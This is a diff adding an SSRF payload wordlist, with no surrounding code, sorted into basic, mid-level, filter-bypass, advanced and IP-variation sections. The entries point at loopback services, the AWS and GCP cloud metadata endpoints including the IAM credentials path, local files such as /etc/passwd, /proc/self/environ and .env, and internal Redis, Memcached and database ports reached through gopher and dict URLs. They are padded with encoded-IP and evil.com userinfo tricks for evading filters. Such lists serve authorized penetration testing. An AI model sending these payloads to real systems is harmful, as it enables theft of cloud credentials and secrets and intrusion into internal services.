@@ -1,0 +1,99 @@
+# ===== BASIC SSRF PAYLOADS =====
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+http://127.0.0.1:80
+http://localhost:80
+http://127.0.1.1
+http://127.1.1.1
+http://169.254.169.254                   # AWS metadata
+http://metadata.google.internal          # GCP metadata
+
+# ===== MID LEVEL SSRF PAYLOADS =====
+http://127.0.0.1:8080
+http://127.0.0.1:3128
+http://127.0.0.1:9000
+http://127.0.0.1:22
+http://localhost:8080
+http://localhost:3128
+http://localhost:9000
+http://localhost:22
+http://127.0.0.1/.git
+http://localhost/.env
+http://127.0.0.1/.DS_Store
+http://localhost/.bashrc
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://[::ffff:127.0.0.1]
+http://2130706433                         # decimal of 127.0.0.1
+http://0177.0.0.1                         # octal
+http://0x7f000001                         # hex
+
+# ===== BYPASS / FILTER EVASION PAYLOADS =====
+http://127.0.0.1@evil.com
+http://127.0.0.1#@evil.com
+http://localhost@evil.com
+http://localhost#@evil.com
+http://169.254.169.254@evil.com
+http://169.254.169.254#@evil.com
+http://127.0.0.1/%2e%2e
+http://127.0.0.1%09/
+http://127.0.0.1%00/
+http://127.0.0.1%23/
+http://127.0.0.1:80%2F..
+http://127.0.0.1:80/%2e%2e
+http://localhost/%2e%2e/
+http://localhost/%09
+http://localhost/%00
+http://[::ffff:7f00:1]
+http://127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+http://0x7f.0x0.0x0.0x1
+http://0177.1
+
+# ===== ADVANCED SSRF PAYLOADS =====
+file:///etc/passwd
+file:///proc/self/environ
+file:///windows/win.ini
+dict://127.0.0.1:80
+ftp://127.0.0.1:21
+gopher://127.0.0.1:6379/_HELLO
+gopher://127.0.0.1:11211/_stats
+gopher://localhost:80/_GET%20/index.html
+http://127.0.0.1:80/admin
+http://localhost:8080/debug/pprof
+http://localhost:8080/server-status
+http://localhost:8000/dashboard
+http://localhost:8000/config
+http://localhost:9200/_cat/indices?v
+http://localhost:5000/metrics
+http://127.0.0.1:15672/#/queues
+http://127.0.0.1:27017
+http://127.0.0.1:3306
+http://127.0.0.1:5432
+http://localhost:3000/.env
+
+# ===== EXTRA IP VARIATIONS =====
+http://127.0.0.2
+http://127.0.0.3
+http://127.0.0.4
+http://127.0.0.5
+http://127.0.0.6
+http://127.0.0.7
+http://127.0.0.8
+http://127.0.0.9
+http://127.0.0.10
+http://127.0.0.11
+http://127.0.0.12
+http://127.0.0.13
+http://127.0.0.14
+http://127.0.0.15
+http://127.0.0.16
+http://127.0.0.17
+http://127.0.0.18
+http://127.0.0.19
+http://127.0.0.20
+http://127.0.0.21
